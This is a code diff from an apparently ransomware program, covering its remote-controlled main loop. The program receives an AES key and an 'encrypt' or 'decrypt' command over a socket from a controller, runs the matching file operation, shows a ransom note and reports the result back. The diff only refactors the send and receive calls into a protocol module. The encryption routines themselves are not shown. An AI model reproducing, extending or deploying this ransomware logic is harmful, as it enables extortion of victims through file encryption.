@@ -105,9 +105,9 @@ def main():
             
             while True:
 
-                aes_key = receive(secure_sock)
+                aes_key = protocol.receive(secure_sock)
                             
-                action = receive(secure_sock).decode("utf-8")
+                action = protocol.receive(secure_sock).decode("utf-8")
                 
                 if action == "encrypt":
                     
@@ -116,7 +116,7 @@ def main():
                     del aes_key
                     show_ransom_note_encryption()
                     
-                    send(secure_sock, "the files are encrypted")
+                    protocol.send(secure_sock, "the files are encrypted")
                 
                 elif action == "decrypt":
                     
@@ -124,7 +124,7 @@ def main():
                     del aes_key
                     show_ransom_note_decryption()
                     
-                    send(secure_sock, "the files are decrypted")
+                    protocol.send(secure_sock, "the files are decrypted")
                 
                 
                 sys.exit()
